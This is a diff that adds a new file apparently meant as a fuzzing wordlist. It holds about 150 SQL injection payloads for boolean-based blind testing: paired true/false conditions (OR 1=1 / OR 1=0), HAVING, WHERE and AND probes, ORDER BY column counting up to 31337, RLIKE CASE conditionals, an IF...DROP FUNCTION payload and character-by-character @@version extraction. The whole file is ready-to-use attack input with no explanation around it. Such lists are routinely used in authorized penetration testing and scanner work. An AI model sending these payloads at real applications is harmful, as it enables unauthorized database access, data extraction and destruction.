@@ -1,0 +1,154 @@
+'OR 1=1 limit 1-- a
+'OR 1=0 limit 1-- a
+'OR x=x limit 1-- a
+'OR x=y limit 1-- a
+'OR 1=1# limit 1-- a
+'OR 1=0# limit 1-- a
+'OR x=x# limit 1-- a
+'OR x=y# limit 1-- a
+'OR 1=1 limit 1-- a
+'OR 1=0 limit 1-- a
+'OR x=x limit 1-- a
+'OR x=y limit 1 -- a
+'OR 3409=3409 AND ('pytW' LIKE 'pytW -- a
+'OR 3409=3409 AND ('pytW' LIKE 'pytY -- a
+'HAVING 1=1 -- a
+'HAVING 1=0 -- a
+'HAVING 1=1# -- a
+'HAVING 1=0# -- a
+'HAVING 1=1-- -- a
+'HAVING 1=0-- -- a
+'AND 1=1 -- a
+'AND 1=0 -- a
+'AND 1=1-- -- a
+'AND 1=0-- -- a
+'AND 1=1# -- a
+'AND 1=0# -- a
+'AND 1=1 AND '%'=' -- a
+'AND 1=0 AND '%'=' -- a
+'AND 1083=1083 AND (1427=1427 -- a
+'AND 7506=9091 AND (5913=5913 -- a
+'AND 1083=1083 AND ('1427=1427 -- a
+'AND 7506=9091 AND ('5913=5913 -- a
+'AND 7300=7300 AND 'pKlZ'='pKlZ -- a
+'AND 7300=7300 AND 'pKlZ'='pKlY -- a
+'AND 7300=7300 AND ('pKlZ'='pKlZ -- a
+'AND 7300=7300 AND ('pKlZ'='pKlY -- a
+'AS INJECTX WHERE 1=1 AND 1=1 -- a
+'AS INJECTX WHERE 1=1 AND 1=0 -- a
+'AS INJECTX WHERE 1=1 AND 1=1# -- a
+'AS INJECTX WHERE 1=1 AND 1=0# -- a
+'AS INJECTX WHERE 1=1 AND 1=1-- -- a
+'AS INJECTX WHERE 1=1 AND 1=0-- -- a
+'WHERE 1=1 AND 1=1 -- a
+'WHERE 1=1 AND 1=0 -- a
+'WHERE 1=1 AND 1=1# -- a
+'WHERE 1=1 AND 1=0# -- a
+'WHERE 1=1 AND 1=1-- -- a
+'WHERE 1=1 AND 1=0-- -- a
+'ORDER BY 1-- -- a
+'ORDER BY 2-- -- a
+'ORDER BY 3-- -- a
+'ORDER BY 4-- -- a
+'ORDER BY 5-- -- a
+'ORDER BY 6-- -- a
+'ORDER BY 7-- -- a
+'ORDER BY 8-- -- a
+'ORDER BY 9-- -- a
+'ORDER BY 10-- -- a
+'ORDER BY 11-- -- a
+'ORDER BY 12-- -- a
+'ORDER BY 13-- -- a
+'ORDER BY 14-- -- a
+'ORDER BY 15-- -- a
+'ORDER BY 16-- -- a
+'ORDER BY 17-- -- a
+'ORDER BY 18-- -- a
+'ORDER BY 19-- -- a
+'ORDER BY 20-- -- a
+'ORDER BY 21-- -- a
+'ORDER BY 22-- -- a
+'ORDER BY 23-- -- a
+'ORDER BY 24-- -- a
+'ORDER BY 25-- -- a
+'ORDER BY 26-- -- a
+'ORDER BY 27-- -- a
+'ORDER BY 28-- -- a
+'ORDER BY 29-- -- a
+'ORDER BY 30-- -- a
+'ORDER BY 31337-- -- a
+'ORDER BY 1# -- a
+'ORDER BY 2# -- a
+'ORDER BY 3# -- a
+'ORDER BY 4# -- a
+'ORDER BY 5# -- a
+'ORDER BY 6# -- a
+'ORDER BY 7# -- a
+'ORDER BY 8# -- a
+'ORDER BY 9# -- a
+'ORDER BY 10# -- a
+'ORDER BY 11# -- a
+'ORDER BY 12# -- a
+'ORDER BY 13# -- a
+'ORDER BY 14# -- a
+'ORDER BY 15# -- a
+'ORDER BY 16# -- a
+'ORDER BY 17# -- a
+'ORDER BY 18# -- a
+'ORDER BY 19# -- a
+'ORDER BY 20# -- a
+'ORDER BY 21# -- a
+'ORDER BY 22# -- a
+'ORDER BY 23# -- a
+'ORDER BY 24# -- a
+'ORDER BY 25# -- a
+'ORDER BY 26# -- a
+'ORDER BY 27# -- a
+'ORDER BY 28# -- a
+'ORDER BY 29# -- a
+'ORDER BY 30# -- a
+'ORDER BY 31337# -- a
+'ORDER BY 1 -- a
+'ORDER BY 2 -- a
+'ORDER BY 3 -- a
+'ORDER BY 4 -- a
+'ORDER BY 5 -- a
+'ORDER BY 6 -- a
+'ORDER BY 7 -- a
+'ORDER BY 8 -- a
+'ORDER BY 9 -- a
+'ORDER BY 10 -- a
+'ORDER BY 11 -- a
+'ORDER BY 12 -- a
+'ORDER BY 13 -- a
+'ORDER BY 14 -- a
+'ORDER BY 15 -- a
+'ORDER BY 16 -- a
+'ORDER BY 17 -- a
+'ORDER BY 18 -- a
+'ORDER BY 19 -- a
+'ORDER BY 20 -- a
+'ORDER BY 21 -- a
+'ORDER BY 22 -- a
+'ORDER BY 23 -- a
+'ORDER BY 24 -- a
+'ORDER BY 25 -- a
+'ORDER BY 26 -- a
+'ORDER BY 27 -- a
+'ORDER BY 28 -- a
+'ORDER BY 29 -- a
+'ORDER BY 30 -- a
+'ORDER BY 31337 -- a
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' -- a
+'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' -- a
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- -- a
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- -- a
+'%' AND 8310=8310 AND '%'=' -- a
+'%' AND 8310=8311 AND '%'=' -- a
+'and (select substring(@@version,1,1))='X' -- a
+'and (select substring(@@version,1,1))='M' -- a
+'and (select substring(@@version,2,1))='i' -- a
+'and (select substring(@@version,2,1))='y' -- a
+'and (select substring(@@version,3,1))='c' -- a
+'and (select substring(@@version,3,1))='S' -- a
+'and (select substring(@@version,3,1))='X' -- a
